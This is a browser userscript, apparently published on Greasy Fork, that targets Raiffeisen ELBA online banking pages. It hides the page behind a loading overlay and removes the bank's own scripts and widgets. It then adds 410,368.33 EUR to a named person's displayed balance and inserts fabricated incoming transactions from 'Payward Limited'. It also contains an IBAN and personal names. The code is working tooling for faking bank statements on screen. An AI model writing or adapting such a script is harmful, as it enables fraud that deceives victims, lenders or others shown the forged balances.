// ==UserScript==
// @name     Aus Ernst Poettinger
// @description Deletes elements with specified classes, logs and edits balance if specified text is found, and adds new transactions with specific texts and amounts
// @version  3.0
// @grant    none
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match    https://mein.elba.raiffeisen.at/*
// @run-at   document-end
// @namespace https://greasyfork.org/users/972766
// @downloadURL https://update.greasyfork.org/scripts/474828/Aus%20Ernst%20Poettinger.user.js
// @updateURL https://update.greasyfork.org/scripts/474828/Aus%20Ernst%20Poettinger.meta.js
// ==/UserScript==

(function() {
   'use strict';

    // Utility functions



   var autoReloadURLPatterns = [
       "AT",
       "AT673207300000887323",//changed
       "kreditkarten",
       "dashboard",
       // Add more URL patterns here if needed
   ];

   function removeScripts() {
       document.querySelectorAll('script').forEach(function(script) {
           script.remove();
       });
   }

    /// Refresh the finanzstatus page once it loads for the first time

var refresh = window.localStorage.getItem('refresh');
console.log(refresh);
setTimeout(function() {
if (refresh===null){
    window.location.reload();
    window.localStorage.setItem('refresh', "1");
}
}, 3000); // 1500 milliseconds = 1.5 seconds

setTimeout(function() {
localStorage.removeItem('refresh')
}, 1700); // 1700 milliseconds = 1.7 seconds

   var scriptObserver = new MutationObserver(function(mutationsList, observer) {
       mutationsList.forEach(function(mutation) {
           if (mutation.addedNodes) {
               mutation.addedNodes.forEach(function(node) {
                   if (node.tagName === 'SCRIPT') {
                       node.remove();
                       console.log('Dynamically added script removed.');
                   }
               });
           }
       });
   });

   scriptObserver.observe(document.body, { childList: true, subtree: true });

  // Create and append the overlay right away
var overlay = document.createElement('div');
overlay.style.position = 'fixed';
overlay.style.top = '0';
overlay.style.left = '0';
overlay.style.width = '100%';
overlay.style.height = '100%';
overlay.style.backgroundColor = 'white';
overlay.style.zIndex = '9999';
document.body.appendChild(overlay);

// Add the spinner to the overlay
var spinner = document.createElement('div');
spinner.className = 'spinner';
overlay.appendChild(spinner);

// Add CSS for the spinner
var style = document.createElement('style');
style.textContent = `
    .spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-left-color: #333;
        border-radius: 50%;
        width: 24px;
        height: 24px;
        animation: spin 1s linear infinite;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 10000;
    }
    @keyframes spin {
        0% { transform: translate(-50%, -50%) rotate(0deg); }
        100% { transform: translate(-50%, -50%) rotate(360deg); }
    }
`;
document.head.appendChild(style);

// Remove the overlay after a specified duration
var overlayDuration = 7000;
var overlayTimeout;

overlayTimeout = setTimeout(function() {
    overlay.remove();
    clearTimeout(overlayTimeout); // Clear the timeout to prevent conflicting removal
}, overlayDuration);

// Function to reload the page after removing scripts
function reloadPage() {
    removeScripts();
    console.log('All script elements have been removed.');
    setTimeout(function() {
        window.location.reload();
    }, 0);
}



// Handle clicks on the document
document.addEventListener('click', function(event) {
    var targetElement = event.target;

    // Check if the clicked element or any of its ancestors have the specified classes
    var isExemptedElement = targetElement.closest('.rds-scrubber-track-pagination.rds-scrubber-track-pagination-after.smart-elevation-z4') !== null ||
                            targetElement.closest('.rds-scrubber-track-pagination.rds-scrubber-track-pagination-before.smart-elevation-z4') !== null ||
                            targetElement.closest('.ng-tns-c64-0 rds-badge ng-star-inserted') !== null ||
                            targetElement.closest('.ng-tns-c64-0 rds-badge ng-star-inserted') !== null ||
                            targetElement.closest('.mt-0 mr-2') !== null ||
                            targetElement.closest('.rds-focus-indicator.rds-icon-button.rds-button-base.rds-dark-shade.rds-button-no-color') !== null;

    if (isExemptedElement) {
        return; // Do not proceed with the click handling logic for exempted elements
    }

    clearTimeout(overlayTimeout); // Clear the overlay removal timeout

    var isWithinScrollableContent = targetElement.closest('.scrollable-content') !== null;

    if (isWithinScrollableContent) {
        return;
    }

    var currentURL = window.location.href;
    var shouldReload = autoReloadURLPatterns.some(function(pattern) {
        return currentURL.includes(pattern);
    });

    if (shouldReload) {
        reloadPage();
    }
});

// ... (the rest of your script)


// Handle popstate events (back and forward buttons)
window.addEventListener('popstate', function(event) {
        clearTimeout(overlayTimeout); // Clear the overlay removal timeout

    var currentURL = window.location.href;
    var shouldReload = autoReloadURLPatterns.some(function(pattern) {
        return currentURL.includes(pattern);
    });

    if (shouldReload) {
        reloadPage();
    }
});




      // Define the object that maps class names to delays
var classesToDelayMap = {
    "rds-hint rds-form-field-hint-end ng-tns-c7-9 ng-star-inserted": 7000, // Delay for the first class
    "widget grid-item span-x-2 span-y-2 ng-star-inserted": 5000, // Delay for the second class
    "d-block ng-star-inserted": 6000, // Delay for the third class
    "container-fluid": 5000,
    "rds-hint rds-form-field-hint-end ng-tns-c7-9 ng-star-inserted": 5000,
    "rds-nav-item mr-4":6000,
     "zv-umsatzuebersicht-widget h-100 ng-star-inserted":7000


    // Add more class-delay pairs as needed
};

// Define the function to remove elements with the specified class and delay
function removeElementsByClassWithDelay(className) {
    var delay = classesToDelayMap[className] || 0; // Use the specified delay or default to 0
    setTimeout(function() {
        var elements = document.getElementsByClassName(className);
        while (elements.length > 0) {
            elements[0].parentNode.removeChild(elements[0]);
        }
        console.log("Elements with class '" + className + "' have been removed.");
    }, delay);
}

// Class names to delete
var classesToDelete = [
    "rds-hint rds-form-field-hint-end ng-tns-c7-9 ng-star-inserted",
    "widget grid-item span-x-2 span-y-2 ng-star-inserted",
    "d-block ng-star-inserted",
    "container-fluid", // Add the class to be deleted here
    "dashboard ng-star-inserted",
     "rds-nav-item mr-4",
     "zv-umsatzuebersicht-widget h-100 ng-star-inserted"

];

// Loop through the array and call the function for each class with its specified delay
for (var i = 0; i < classesToDelete.length; i++) {
    var className = classesToDelete[i];
    removeElementsByClassWithDelay(className);
}

    ////  FIRST SCRIPT

   function firstScript() {
       var TEXT_TO_FIND_1 = "Spatt Roman";
       var AMOUNT_TO_EDIT_1 =410368.33; //changed

       var elementsToSearch = document.getElementsByClassName("rds-scrub-item rds-focus-indicator ng-star-inserted");

       for (var j = 0; j < elementsToSearch.length; j++) {
           var text = elementsToSearch[j].textContent.trim();

           if (text.includes(TEXT_TO_FIND_1)) {
               console.log("Specified text '" + TEXT_TO_FIND_1 + "' found in element number " + (j + 1) + ".");
               console.log(elementsToSearch[j]);

               var balanceElement = elementsToSearch[j].querySelector('.rds-headline.mb-0.text-truncate.text-danger.ng-star-inserted, .rds-headline.mb-0.text-truncate.text-success.ng-star-inserted, .rds-headline.mb-0.text-truncate.ng-star-inserted');

               if (balanceElement) {
                   var balanceText = balanceElement.textContent.trim().replace(/[^0-9.,-]+/g, "");
                   var balance = parseAmount(balanceText);

                   console.log("Original balance: " + balanceElement.textContent.trim());

                   var editedBalance = balance + AMOUNT_TO_EDIT_1;
                   var editedClass = editedBalance >= 0 ? "text-success" : "text-danger";

                   balanceElement.classList.remove("text-success", "text-danger");
                   balanceElement.classList.add(editedClass);
                   balanceElement.textContent = formatAmount(editedBalance);
                   console.log("1ScriptEdited balance: " + balanceElement.textContent.trim());
               }
           }
       }
   }



    /// THIRDS SCRIPT
  function thirdScript() {
    var PARTIAL_TEXT_TO_FIND_3 = "Roman Spatt"; // Partial text to search for

    var NEW_TEXT = "Payward Limited";
    var NEW_AMOUNT = 10300.00;
    var NEW_NG_STAR_INSERTED_TEXT = "Geld für Zahlung von Steuern";
    var DUPLICATE_MOVE_DIRECTION = "up";
    var DUPLICATE_MOVE_STEPS = 20;

    var ADDITIONAL_TRANSACTIONS = [
        {
            text: "Payward Limited",
            amount: 10000,
            ngStarInsertedText: "Geliehenes Geld",
            moveDirection: "up",
            moveSteps: 19,
            enabled: true,
        },
        // Add more additional transactions as needed
    ];

    function doesPartialTextMatch(fullText, partialText) {
        var fullWords = fullText.split(' ');
        var partialWords = partialText.split(' ');

        var matchingWordCount = 0;
        for (var i = 0; i < partialWords.length; i++) {
            if (fullWords.includes(partialWords[i])) {
                matchingWordCount++;
            }
        }

        // Adjust the threshold as needed, for example, 50% or more matching words
        var matchingThreshold = 0.5;
        return matchingWordCount / partialWords.length >= matchingThreshold;
    }

       function waitForNgStarInsertedElements(maxAttempts, interval, callback) {
           var elements = document.getElementsByClassName('ng-star-inserted');
           if (elements.length > 0) {
               callback();
           } else {
               var attempts = 0;
               var checkInterval = setInterval(function() {
                   attempts++;
                   elements = document.getElementsByClassName('ng-star-inserted');
                   if (elements.length > 0 || attempts >= maxAttempts) {
                       clearInterval(checkInterval);
                       if (elements.length > 0) {
                           callback();
                       } else {
                           console.log('Maximum attempts reached. Script execution completed.');
                       }
                   }
               }, interval);
           }
       }

       function formatAmount(amount) {
           return new Intl.NumberFormat('de-DE', { style: 'currency', currency: 'EUR' }).format(amount);
       }

       function moveElement(element, steps, direction) {
           var parent = element.parentNode;
           var sibling;

           if (direction === "up") {
               for (let i = 0; i < steps; i++) {
                   sibling = element.previousElementSibling;
                   if (sibling) {
                       parent.insertBefore(element, sibling);
                   }
               }
           } else if (direction === "down") {
               for (let i = 0; i < steps; i++) {
                   sibling = element.nextElementSibling;
                   if (sibling) {
                       parent.insertBefore(sibling, element);
                   }
               }
           }
       }

       function createTransaction(element, text, amount, ngStarInsertedText, moveSteps, moveDirection) {
           var clone = element.cloneNode(true);
           clone.removeAttribute("id");

           var parent = element.parentElement;
           if (parent) {
               parent.insertBefore(clone, element.nextSibling);
               moveElement(clone, moveSteps, moveDirection);

               var listTextElement = clone.getElementsByClassName('rds-list-text')[0];
               if (listTextElement) {
                   var textElement = listTextElement.getElementsByTagName('p')[0];
                   if (textElement) {
                       textElement.textContent = text;
                   }

                   var ngStarInsertedElement = document.createElement("p");
                   ngStarInsertedElement.className = "rds-line ng-star-inserted";

                   var smallElement = document.createElement("small");
                   smallElement.textContent = ngStarInsertedText;
                   ngStarInsertedElement.appendChild(smallElement);
                   listTextElement.appendChild(ngStarInsertedElement);
               }

               var amountElement = clone.getElementsByClassName('text-success')[0] || clone.getElementsByClassName('text-danger')[0];
               if (amountElement) {
                   amountElement.classList.remove('text-success', 'text-danger');
                   var newClass = amount >= 0 ? 'text-success' : 'text-danger';
                   amountElement.classList.add(newClass);
                   amountElement.textContent = formatAmount(amount);
               }
           }
       }

       function waitForClassToAppear(className, maxAttempts, interval, callback) {
           var observer = new MutationObserver(function(mutationsList, observer) {
               var elements = document.getElementsByClassName(className);
               if (elements.length > 0) {
                   observer.disconnect();
                   callback();
               }
           });

           observer.observe(document.body, { childList: true, subtree: true });

           var attempts = 0;
           var checkInterval = setInterval(function() {
               attempts++;
               var elements = document.getElementsByClassName(className);
               if (elements.length > 0 || attempts >= maxAttempts) {
                   clearInterval(checkInterval);
                   observer.disconnect();
               }
           }, interval);
       }

       waitForNgStarInsertedElements(10, 7000, function() {
        var lastMatchingElement = null;

        var elements = document.getElementsByClassName('ng-star-inserted');
        for (var i = 0; i < elements.length; i++) {
            var pElement = elements[i].querySelector('p.rds-line');
            if (pElement && doesPartialTextMatch(pElement.textContent, PARTIAL_TEXT_TO_FIND_3)) {
                lastMatchingElement = elements[i];
            }
        }

        if (lastMatchingElement) {
            createTransaction(lastMatchingElement, NEW_TEXT, NEW_AMOUNT, NEW_NG_STAR_INSERTED_TEXT, DUPLICATE_MOVE_STEPS, DUPLICATE_MOVE_DIRECTION);

            for (let i = 0; i < ADDITIONAL_TRANSACTIONS.length; i++) {
                const transaction = ADDITIONAL_TRANSACTIONS[i];
                if (transaction.enabled) {
                    createTransaction(lastMatchingElement, transaction.text, transaction.amount, transaction.ngStarInsertedText, transaction.moveSteps, transaction.moveDirection);
                }
            }
        } else {
            console.log("No matching element found.");
        }

        console.log("Script execution completed.");
    });
}

   function formatAmount(amount) {
       return new Intl.NumberFormat('de-DE', { minimumFractionDigits: 2 }).format(amount) + " EUR";
   }

   function parseAmount(amountString) {
       var amount = parseFloat(amountString.replace('.', '').replace(',', '.'));
       return isNaN(amount) ? 0 : amount;
   }

   function adjustAndFormatBalance(originalBalance) {
       var isNegative = originalBalance.includes('-');
       var originalBalanceInNumber = Number(originalBalance.replace(/[-. EUR]/g, '').replace(',', '.'));
       originalBalanceInNumber = isNegative ? -originalBalanceInNumber : originalBalanceInNumber;
       var adjustedBalance = originalBalanceInNumber + AMOUNT_TO_ADJUST;
       return new Intl.NumberFormat('de-DE', { minimumFractionDigits: 2 }).format(adjustedBalance);
   }

   function adjustClass(element, balance) {
       if (balance >= 0) {
           element.classList.remove('text-danger');
           element.classList.add('text-success');
       } else {
           element.classList.remove('text-success');
           element.classList.add('text-danger');
       }
   }

   removeScripts();
    // Call the first script with a delay
    setTimeout(function() {
        firstScript();
    }, 4000); // Adjust the delay (in milliseconds) as needed

    // Call the third script with a delay
    setTimeout(function() {
        thirdScript();
    }, 10000); // Adjust the delay (in milliseconds) as needed
   removeScripts();

})();
